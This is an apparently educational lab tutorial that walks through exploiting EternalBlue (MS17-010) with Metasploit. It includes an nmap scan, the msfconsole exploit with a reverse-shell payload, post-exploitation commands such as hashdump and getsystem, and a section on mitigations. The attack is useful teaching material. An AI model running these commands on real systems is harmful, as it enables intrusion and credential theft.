# Exploiting a Vulnerable SMB Server

## Introduction
This practice example demonstrates how to exploit a vulnerable SMB (Server Message Block) service using Metasploit. We will target an outdated Windows system running SMBv1 with the famous **EternalBlue (MS17-010)** vulnerability, which allows remote code execution.

## Table of Contents
- [Setup the Target](#setup-the-target)
- [Scanning for Vulnerabilities](#scanning-for-vulnerabilities)
- [Exploitation using Metasploit](#exploitation-using-metasploit)
- [Gaining a Shell](#gaining-a-shell)
- [Post-Exploitation](#post-exploitation)
- [Mitigation Measures](#mitigation-measures)
- [Conclusion](#conclusion)

## Setup the Target
Ensure that you have a vulnerable Windows machine running SMBv1. You can use Metasploitable3 or a Windows 7 VM with SMBv1 enabled.

1. Set up the vulnerable Windows machine.
2. Check the target's IP address:
   ```powershell
   ipconfig
   ```
   Suppose the target IP is `192.168.1.100`.

## Scanning for Vulnerabilities
To identify SMB vulnerabilities, use Nmap:

```bash
nmap -p 445 --script=smb-vuln-ms17-010 192.168.1.100
```

### Explanation:
- `-p 445`: Scans the SMB port.
- `--script=smb-vuln-ms17-010`: Checks if the system is vulnerable to EternalBlue.

If the scan confirms the vulnerability, proceed with exploitation.

## Exploitation using Metasploit
Launch Metasploit and use the EternalBlue exploit:

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set RPORT 445
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your_attack_machine_IP>
exploit
```

### Explanation:
- `use exploit/windows/smb/ms17_010_eternalblue`: Loads the EternalBlue exploit.
- `set RHOSTS 192.168.1.100`: Specifies the target IP.
- `set RPORT 445`: Sets the SMB port.
- `set PAYLOAD windows/x64/meterpreter/reverse_tcp`: Specifies a reverse shell payload.
- `set LHOST <your_attack_machine_IP>`: Sets the attacker's IP to receive the shell.
- `exploit`: Executes the attack.

## Gaining a Shell
If successful, you will get a Meterpreter session:

```bash
meterpreter > sysinfo
meterpreter > getuid
```

### Explanation:
- `sysinfo`: Displays system details.
- `getuid`: Checks current user privileges.

At this point, you have successfully gained remote access.

## Post-Exploitation
After gaining access, perform post-exploitation tasks:

### Extracting System Information
```bash
meterpreter > hashdump
meterpreter > run post/windows/gather/enum_shares
```

### Privilege Escalation
```bash
meterpreter > getsystem
```

## Mitigation Measures
To prevent this attack:
1. **Update Windows** to patch MS17-010.
2. **Disable SMBv1** using:
   ```powershell
   Set-SmbServerConfiguration -EnableSMB1Protocol $false
   ```
3. **Use strong passwords** to prevent unauthorized access.
4. **Enable firewalls** to restrict SMB access from untrusted networks.

## Conclusion
This practice example demonstrated how to exploit a vulnerable SMB service using Metasploit. We performed reconnaissance, executed an exploit, gained unauthorized access, and explored post-exploitation techniques. Proper security measures should be implemented to prevent such attacks.

_For more learning, refer to [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)._
